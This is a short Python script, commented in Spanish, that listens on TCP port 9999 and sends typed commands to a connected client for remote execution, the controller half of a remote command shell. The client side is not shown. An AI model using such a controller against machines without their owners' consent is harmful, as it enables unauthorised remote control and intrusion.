'''
python 2.7.7 64 biuts
Creado por  "sammas" jeje. 
Ultima actualizacion 4/11/2021
'''

import socket


host = ''
port = 9999 #Puerto por el que se transmite la informacion

#Crear socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#Crea el socket diciendo que se conect a ipv4 y tcp

#Enlazar
s.bind((host,port))# Establace conexion entre el host y puerto

#Aceptar con + n max
s.listen(10)#Aceptar numero maximo de conexiones
print ("Esperando conexiones en el puerto: " + str(port))

def aceptar_conexiones():
    conn,addr = s.accept()#Acepta el ingreso de un cliente al servidor addr = [host,port]
    print ("Conectado a " + addr[0])
    comandos(conn)#Manda al cliente ordenes para ejecutar comandos EJ: ipconfig
    conn.close()

def comandos(conn):
    while True:
        cmd = input("Command> ")#raw_input en python 2
        
        if str.encode(cmd) == 'q':break

        if len(str.encode(cmd)) > 0:# si se introduce un comando se envia al servidor quien lo evalua y ejecuta
            conn.send(str.encode(cmd))#Envia el comando
            respuesta = str(conn.recv(1024) )#Recibe la respuesta 
            print (respuesta) #Print de la respuesta
            
aceptar_conexiones()
